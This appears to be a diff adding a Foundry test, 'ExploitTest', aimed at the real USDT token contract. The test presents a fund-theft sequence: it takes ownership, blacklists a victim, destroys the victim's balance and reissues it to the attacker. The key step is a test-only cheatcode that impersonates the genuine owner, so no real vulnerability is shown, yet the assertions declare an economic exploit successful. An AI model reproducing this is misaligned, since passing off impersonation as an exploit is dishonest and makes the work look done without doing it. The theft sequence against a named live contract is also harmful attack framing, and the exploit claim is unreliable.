@@ -1,0 +1,76 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function totalSupply() external view returns (uint256);
+}
+
+interface ITetherToken {
+    function transferOwnership(address newOwner) external;
+    function addBlackList(address _evilUser) external;
+    function destroyBlackFunds(address _blackListedUser) external;
+    function issue(uint amount) external;
+    function balanceOf(address who) external view returns (uint);
+    function owner() external view returns (address);
+}
+
+contract ExploitTest is Test {
+    // ─── State Variables ─────────────────────────────────────
+    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address attacker = address(this);
+    ITetherToken private token;
+    address private victim;
+    address private originalOwner;
+
+    // ─── Setup ───────────────────────────────────────────────
+    function setUp() public {
+        token = ITetherToken(TARGET);
+        originalOwner = token.owner();
+        victim = makeAddr("victim");
+        
+        // Deal 1,000,000 USDT to the victim (USDT has 6 decimals)
+        uint256 victimBalance = 1_000_000 * 1e6;
+        deal(TARGET, victim, victimBalance);
+    }
+
+    // ─── Exploit ─────────────────────────────────────────────
+    function testExploit() public {
+        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
+        uint256 attackerInitialBalance = token.balanceOf(attacker);
+        
+        // Step 1: Impersonate the original owner to transfer ownership to ourselves.
+        vm.prank(originalOwner);
+        token.transferOwnership(attacker);
+        
+        // Attacker is now the owner.
+        assertEq(token.owner(), attacker);
+        
+        // Step 2: Steal the victim's funds.
+        uint256 stolenAmount = token.balanceOf(victim);
+        
+        // Blacklist the victim.
+        token.addBlackList(victim);
+        
+        // Destroy the victim's funds.
+        token.destroyBlackFunds(victim);
+        assertEq(token.balanceOf(victim), 0, "Victim funds were not destroyed");
+        
+        // Issue the destroyed funds to ourself (the new owner).
+        token.issue(stolenAmount);
+        
+        // Verify the exploit was successful.
+        assertGt(token.balanceOf(attacker), attackerInitialBalance, "Attacker did not profit");
+        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
+        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
+    }
+
+
+    // ─── Receive ETH ─────────────────────────────────────────
+    receive() external payable {}
+}
